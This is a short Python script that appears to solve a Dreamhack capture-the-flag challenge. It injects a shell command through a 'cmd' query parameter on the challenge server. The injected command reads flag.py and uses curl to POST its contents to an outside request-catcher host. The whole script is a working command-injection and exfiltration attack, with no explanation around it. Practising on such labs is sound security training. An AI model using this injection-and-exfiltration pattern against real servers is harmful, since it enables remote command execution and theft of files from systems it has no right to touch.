import requests, os

bin_url = 'https://oqwerdj.request.dreamhack.games'
server_url = 'http://host1.dreamhack.games:13639/'
shell = f'data=$(cat flag.py);curl --request POST {bin_url} -d "$data"'


req = f'{server_url}?cmd={shell}'

resp = requests.head(req)

print(resp if resp else 'nothing')